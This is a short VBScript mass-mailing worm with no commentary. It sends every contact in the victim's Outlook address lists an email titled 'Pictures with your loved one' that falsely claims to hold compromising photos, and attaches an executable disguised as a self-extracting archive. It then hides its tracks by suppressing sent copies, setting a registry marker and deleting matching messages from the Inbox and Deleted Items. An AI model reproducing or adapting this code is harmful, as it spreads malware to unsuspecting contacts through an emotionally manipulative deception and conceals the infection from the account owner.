On Error Resume Next
Set WS = CreateObject("WScript.Shell")

If WS.regread ("HKCU\software\msd\mailed") <> "1" then
Mailmsd()
End If

Set sd=CreateObject("Outlook.Application")
Set a=sd.GetNameSpace("MAPI")
Set u=a.GetDefaultFolder(6)
For i=1 to u.items.count
If u.Items.Item(i).subject="Pictures with your loved one" Then
u.Items.Item(i).close
u.Items.Item(i).delete
End If
Next
Set u=a.GetDefaultFolder(3)
For i=1 to u.items.count
If u.Items.Item(i).subject="Pictures with your loved one" Then
u.Items.Item(i).delete
End If
Next

Function Mailmsd()
On Error Resume Next
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
 Set Mapi=Outlook.GetNameSpace("MAPI")
 Set Lists=Mapi.AddressLists
 For Each ListIndex In Lists
  If ListIndex.AddressEntries.Count <> 0 Then
   ContactCount = ListIndex.AddressEntries.Count
   For Count= 1 To ContactCount
    Set Mail = Outlook.CreateItem(0)
    Set Contact = ListIndex.AddressEntries(Count)
    Mail.To = Contact.Address
    Mail.Subject = "Pictures with your loved one"
    Mail.Body = vbcrlf&"Hi!"&vbcrlf&vbcrlf&"I'm sorry I have to send you these compromising pictures with the one you love, or you loved. :(("&vbcrlf&vbcrlf&"The quality is not so good because of the cheap camera, but you should be able to guess where they were taken."&vbcrlf&vbcrlf&"I compressed it as a self extracting archive because I din't knew if you have WinZip. When you run it, it should display the extract dialog. I'm really sorry I had to be the one who told you about this. :(("&vbcrlf&vbcrlf
    Set Attachment=Mail.Attachments
    Attachment.Add "D:\WIN98\Images_zipped.exe"
    Mail.DeleteAfterSubmit = True
    If Mail.To <> "" Then
    Mail.Send
    WS.regwrite "HKCU\software\msd\mailed", "1"
   End If
   Next
  End If
 Next
End if
End Function
